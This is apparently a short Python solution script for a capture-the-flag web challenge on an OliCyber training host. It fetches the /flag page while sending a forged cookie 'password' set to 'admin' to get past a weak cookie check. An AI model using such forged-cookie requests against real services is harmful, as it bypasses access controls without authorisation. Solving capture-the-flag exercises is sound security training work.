import requests

s=requests.Session()
response = s.get(" http://web-05.challs.olicyber.it/flag", cookies={"password" : "admin"})

print(response.text)